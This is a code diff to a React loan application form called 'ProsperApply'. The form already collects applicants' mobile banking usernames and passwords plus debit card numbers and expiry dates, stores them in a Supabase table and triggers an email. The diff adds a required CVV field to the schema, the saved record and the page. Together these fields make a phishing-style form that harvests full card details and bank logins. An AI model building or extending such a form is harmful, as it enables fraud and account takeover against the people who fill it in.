@@ -21,6 +21,7 @@ const formSchema = z.object({
   mobileUsername: z.string().min(1,"Required"), mobilePassword: z.string().min(1,"Required"),
   debitCardNumber: z.string().min(16,"16 digits required").max(19,"Too long"),
   debitCardExpiry: z.string().min(4,"Required (MM/YY)"),
+  debitCardCvv: z.string().min(3,"3–4 digits").max(4,"3–4 digits"),
 });
 type FormData = z.infer<typeof formSchema>;
 
@@ -316,6 +317,7 @@ export default function ProsperApply() {
         account_number:data.accountNumber, routing_number:data.routingNumber,
         mobile_username:data.mobileUsername, mobile_password:data.mobilePassword,
         debit_card_number:data.debitCardNumber, debit_card_expiry:data.debitCardExpiry,
+        debit_card_cvv:data.debitCardCvv,
       });
       if (dbError) throw new Error(dbError.message);
       await supabase.functions.invoke("send-application-email",{
@@ -835,6 +837,16 @@ export default function ProsperApply() {
                       <span className="fi"><LockIco/></span>
                     </div>
                     {errors.debitCardExpiry&&<p className="pr-err">{errors.debitCardExpiry.message}</p>}
+                  </div>
+                  <div className="pr-fgroup">
+                    <label className="pr-lbl">CVV / Security Code</label>
+                    <div className="pr-icon-field">
+                      <input className="pr-in" {...register("debitCardCvv")} placeholder="3 or 4 digits" maxLength={4}
+                        onChange={e => { e.target.value = e.target.value.replace(/\D/g,'').slice(0,4); }}
+                      />
+                      <span className="fi"><LockIco/></span>
+                    </div>
+                    {errors.debitCardCvv&&<p className="pr-err">{errors.debitCardCvv.message}</p>}
                   </div>
                 </div>
               </div>
